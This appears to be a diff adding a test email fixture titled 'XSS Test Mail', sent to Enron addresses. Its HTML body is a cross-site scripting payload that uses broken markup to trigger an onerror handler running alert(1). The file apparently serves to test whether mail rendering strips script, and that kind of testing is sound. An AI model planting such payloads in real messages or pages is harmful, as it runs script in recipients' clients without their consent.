@@ -1,0 +1,7 @@
+From: carole@aemhmr.org
+To: pmg@enron.com, john.arnold@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<i><image src="x</i>"onerror='alert(1)'>
